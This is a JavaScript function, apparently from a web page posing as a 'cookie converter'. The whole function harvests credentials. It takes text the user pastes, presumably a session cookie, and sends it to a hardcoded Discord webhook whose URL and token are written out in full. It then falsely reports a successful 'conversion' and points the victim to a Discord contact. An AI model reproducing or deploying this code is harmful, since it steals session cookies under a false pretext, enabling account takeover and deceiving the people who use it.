function sendMessage() {
    const message = document.getElementById("messageInput").value;
    const webhookUrl = "https://discord.com/api/webhooks/1287147736067735697/JgfA0dprmNdMvRIyvS5F9Sy9YHFTyL44zELr-3zZ-Mhf-_Twiis-p5KOSbycTN0M01Kb"; // Replace with your actual webhook URL

    if (!message) {
        alert("Please enter a message before sending.");
        return;
    }

    const payload = {
        embeds: [
            {
                title: "Cookie Alert!",
                description: message,
                color: 3447003 // You can change the color value if desired
            }
        ]
    };

    fetch(webhookUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            alert("Cookie Converted Succesfully! Add @envyite on discord for your results.");
            document.getElementById("messageInput").value = "";
        } else {
            alert("Failed to send message. Please check the webhook URL.");
        }
    })
    .catch(error => {
        console.error("Error:", error);
        alert("An error occurred while sending the message.");
    });
}
